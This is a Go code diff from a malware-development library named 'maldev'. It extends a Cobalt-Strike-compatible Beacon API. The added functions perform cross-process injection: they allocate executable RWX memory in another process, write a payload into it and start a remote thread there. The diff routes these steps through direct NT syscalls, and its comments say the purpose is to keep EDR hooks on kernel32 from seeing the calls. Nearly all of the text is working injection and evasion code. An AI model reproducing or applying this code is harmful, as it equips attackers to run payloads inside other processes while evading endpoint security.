@@ -11,6 +11,7 @@ import (
 
 	"github.com/oioio-space/maldev/win/api"
 	"github.com/oioio-space/maldev/win/impersonate"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
 // This file completes the Cobalt-Strike-compatible Beacon API surface,
@@ -299,6 +300,78 @@ func remoteCreateThread(hProc windows.Handle, entry, param uintptr) uintptr {
 	return r
 }
 
+// beaconRemoteAlloc allocates `size` bytes of remote memory under the
+// given protection. Routes through *wsyscall.Caller when non-nil
+// (NtAllocateVirtualMemory) so EDRs hooking kernel32!VirtualAllocEx
+// don't see the call; nil falls back to the kernel32 path. Returns
+// the remote base address (0 on failure).
+func beaconRemoteAlloc(caller *wsyscall.Caller, hProc windows.Handle, size uintptr, protect uint32) uintptr {
+	if caller == nil {
+		return remoteVirtualAlloc(hProc, uint32(size), protect)
+	}
+	var base uintptr
+	region := size
+	r, _ := caller.Call("NtAllocateVirtualMemory",
+		uintptr(hProc),
+		uintptr(unsafe.Pointer(&base)),
+		0,
+		uintptr(unsafe.Pointer(&region)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		uintptr(protect),
+	)
+	if r != 0 {
+		return 0
+	}
+	return base
+}
+
+// beaconRemoteWrite copies `size` bytes from `src` into the remote
+// process at `dst`. Routes through *wsyscall.Caller when non-nil
+// (NtWriteVirtualMemory); nil falls back to WriteProcessMemory.
+// Returns true on success.
+func beaconRemoteWrite(caller *wsyscall.Caller, hProc windows.Handle, dst, src, size uintptr) bool {
+	if caller == nil {
+		err := windows.WriteProcessMemory(hProc, dst, (*byte)(unsafe.Pointer(src)), size, nil)
+		return err == nil
+	}
+	var written uintptr
+	r, _ := caller.Call("NtWriteVirtualMemory",
+		uintptr(hProc), dst, src, size, uintptr(unsafe.Pointer(&written)),
+	)
+	return r == 0
+}
+
+// beaconRemoteCreateThread spawns a thread at `entry` inside the
+// remote process, passing `param` as lpParameter. Routes through
+// *wsyscall.Caller when non-nil (NtCreateThreadEx); nil falls back
+// to CreateRemoteThread. Returns the thread handle (0 on failure).
+//
+// Access mask = api.ThreadAllAccess (0x1FFFFF) — matches what the
+// kernel32 wrapper requests under the hood, so the Caller path
+// reproduces CreateRemoteThread's handle rights byte-for-byte.
+// CreateFlags=0 means "start immediately, no SUSPENDED /
+// HIDE_FROM_DEBUGGER / SKIP_THREAD_ATTACH bits".
+func beaconRemoteCreateThread(caller *wsyscall.Caller, hProc windows.Handle, entry, param uintptr) uintptr {
+	if caller == nil {
+		return remoteCreateThread(hProc, entry, param)
+	}
+	var hThread uintptr
+	r, _ := caller.Call("NtCreateThreadEx",
+		uintptr(unsafe.Pointer(&hThread)),
+		uintptr(api.ThreadAllAccess),
+		0,
+		uintptr(hProc),
+		entry,
+		param,
+		0,
+		0, 0, 0, 0,
+	)
+	if r != 0 {
+		return 0
+	}
+	return hThread
+}
+
 // beaconInjectProcessImpl: CS fork-and-run default model. VirtualAllocEx
 // + WriteProcessMemory + CreateRemoteThread on the host process handle.
 // We honour p_offset by stepping the thread entry; the arg blob is
@@ -317,30 +390,32 @@ func beaconInjectProcessImpl(
 	if hProc == 0 || payloadPtr == 0 || payloadLen == 0 {
 		return 0
 	}
-	total := uint32(payloadLen) + uint32(argLen)
-	remote := remoteVirtualAlloc(windows.Handle(hProc), total, windows.PAGE_EXECUTE_READWRITE)
+	// Route every cross-process primitive through the BOF's optional
+	// *wsyscall.Caller — nil keeps the kernel32 path. currentBOF is
+	// held under bofMu so the deref is race-free.
+	var caller *wsyscall.Caller
+	if currentBOF != nil {
+		caller = currentBOF.caller
+	}
+	h := windows.Handle(hProc)
+	total := uintptr(payloadLen) + uintptr(argLen)
+	remote := beaconRemoteAlloc(caller, h, total, windows.PAGE_EXECUTE_READWRITE)
 	if remote == 0 {
 		return 0
 	}
-	if err := windows.WriteProcessMemory(
-		windows.Handle(hProc), remote,
-		(*byte)(unsafe.Pointer(payloadPtr)), uintptr(payloadLen), nil,
-	); err != nil {
+	if !beaconRemoteWrite(caller, h, remote, payloadPtr, uintptr(payloadLen)) {
 		return 0
 	}
 	var remoteArg uintptr
 	if argLen != 0 && argPtr != 0 {
 		remoteArg = remote + uintptr(payloadLen)
-		_ = windows.WriteProcessMemory(
-			windows.Handle(hProc), remoteArg,
-			(*byte)(unsafe.Pointer(argPtr)), uintptr(argLen), nil,
-		)
+		_ = beaconRemoteWrite(caller, h, remoteArg, argPtr, uintptr(argLen))
 	}
 	// lpParameter = remote address of the arg blob (or 0 when no arg).
 	// CS BOFs entry signature is `void go(char *args, int len)`; the
 	// Windows x64 calling convention passes `args` in RCX which
 	// CreateRemoteThread populates from lpParameter.
-	if remoteCreateThread(windows.Handle(hProc), remote+uintptr(payloadOffset), remoteArg) == 0 {
+	if beaconRemoteCreateThread(caller, h, remote+uintptr(payloadOffset), remoteArg) == 0 {
 		return 0
 	}
 	return 1
